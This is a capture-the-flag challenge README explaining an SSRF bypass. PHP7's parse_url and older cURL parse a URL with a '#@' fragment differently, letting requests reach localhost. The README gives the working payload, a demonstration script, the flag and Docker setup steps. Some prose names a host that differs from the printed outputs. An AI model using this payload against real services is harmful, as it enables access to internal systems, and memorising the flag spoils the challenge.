# [SwampCTF 2019 Web] Brokerboard

## Flavor Text

It's the year 1997 and the Internet is just heating up! :fire:

In order to get ahead of the curve, SIT Industries® has introduced it's first Internet product: The Link Saver™. SIT Industries® has been _very_ secretive about this product - even going so far to hire Kernel Sanders® to test the security!

However, The Kernel discovered that The Link Saver had a little bit of an SSRF problem that allowed any user to fetch the code for The Link Saver™ from `https://localhost/key` and host it themselves :grimacing:. Fortunately, with a lil' `parse_url` magic, SIT Industries® PHP wizards have patched this finding from Kernel Sanders® and are keeping the code behind this wonderful site secure!

... or have they? :wink:

* Flag: flag{y0u_cANn0t_TRU5t_php}
* Expected difficulty: medium

## Description

**Note**: This is kind of a bitch; there's no easy way to get Docker to work with an older version of cURL yet a newer version of PHP. I'm gonna try to get this working eventually but, for now, I've just replicated the vulnerability with code. It sucks but it demonstrates the vulnerability well enough. :/

Inspiration from this challenge is from [A New Era of SSRF - Exploiting URL Parser in
Trending Programming Languages](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf). :)

This challenge is a PHP trick that requires PHP7+ with an older version of cURL; with PHP7, `parse_url` treats certain URLs differently than older versions of cURL. Most PHP apps will prevent SSRF by running `parse_url` on a URL and checking to see whether the `host` is internal or not (i.e. - "localhost", "127.0.0.1", "internal.company.net"). However, there's a mismatch between `parse_url` and older versions of cURL that can be exploited to send internal requests.

To explain, let's look at a typical URL in parse URL. Suppose you have a URL like "https://example.com". Let's run `parse_url` on this:

```php
php > var_dump(parse_url('https://example.com'));
array(2) {
  ["scheme"]=>
  string(5) "https"
  ["host"]=>
  string(15) "example.com"
}
```

We see that we have both a `scheme` of "https" and a `host` of "andrewjkerr.com". If we were checking the host against a list of internal URLs, we're good 'cause "andrewjkerr.com" is not one of them. Passing this URL to cURL will do the following:

```bash
andrewjkerr@kiwi swctf_web4/src (master) » curl -s https://example.com | head -4
<!doctype html>
<html>
<head>
    <title>Example Domain</title>
```

Looks good and we're happy with this!

However, let's take a look at a URL like "https://user:pass@example.com":

```php
php > var_dump(parse_url('https://user:pass@example.com'));
array(4) {
  ["scheme"]=>
  string(5) "https"
  ["host"]=>
  string(15) "example.com"
  ["user"]=>
  string(4) "user"
  ["pass"]=>
  string(4) "pass"
}
```

We see that we now have a `user` and a `pass` in the URL. The `host` is still "andrewjkerr.com" and passes our 'is not internal' check. Passing this URL to cURL will do the following:

```bash
andrewjkerr@kiwi swctf_web4/src (master *) » curl -s https://user:pass@example.com | head -4
<!doctype html>
<html>
<head>
    <title>Example Domain</title>
```

Still fetches "example.com" so we're happy!

Now, let's look at _this_ particular URL: "https://example.com#@https://localhost/key":

```php
php > var_dump(parse_url('https://example.com#@https://localhost/key'));
array(3) {
  ["scheme"]=>
  string(5) "https"
  ["host"]=>
  string(15) "example.com"
  ["fragment"]=>
  string(22) "@https://localhost/key"
}
```

Everything _seems_ to check out; the `host` is still "example.com" and would still pass our 'is not internal' check. But, what happens if we give this URL to cURL (using the cURL from PHP5.4)?

```php
<?php
    function get_data($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1); // Timeout after one second.
        $content = curl_exec($ch);
        curl_close($ch);
        return $content;
    }

    var_dump(get_data("https://example.com#@localhost/key"));

    // Returns content from localhost/key
?>
```

Kinda nifty, right?

## Challenge Solution

The solution to this one is pretty easy if you know about the issue. You need to use the payload from above (`https://www.example.com#@https://localhost/key`) to get the key. :)

### Running the Challenge

Do the following:

```bash
cd src
docker build -t swctf_web4 .
docker run -p 80:80 -d swctf_web4:latest
```

Hit up 127.0.0.1 and you'll see the page!
